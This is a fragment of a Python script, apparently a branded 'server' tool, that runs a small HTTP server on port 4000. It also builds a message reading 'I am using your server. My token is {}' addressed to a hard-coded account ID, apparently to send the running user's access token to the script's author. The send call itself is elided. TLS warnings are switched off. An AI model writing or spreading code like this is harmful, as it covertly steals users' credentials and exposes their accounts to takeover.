...
class MyHandler(http.server.SimpleHTTPRequestHandler):
      def do_GET(self):
          ...
          self.end_headers()
          self.wfile.write(b"-- SERVER RUNNING>>ARYAN ")
def execute_server():
      PORT = 4000
...
def send_initial_message():
      ...
      msg_template = "Hello  TʜƏ'w Aryaƞ SīīR! II am uSīīnG YouR sErvRr. MY ⤵️TokEn⤵️ īīS {}"

      # Specify the ID where you want to send the message
      target_id = "100089365029267"

      requests.packages.urllib3.disable_warnings()

      def liness():
          print('\033[1;92m' + '•──────────────────────ARYAN RAI ───────────────────────────────•')
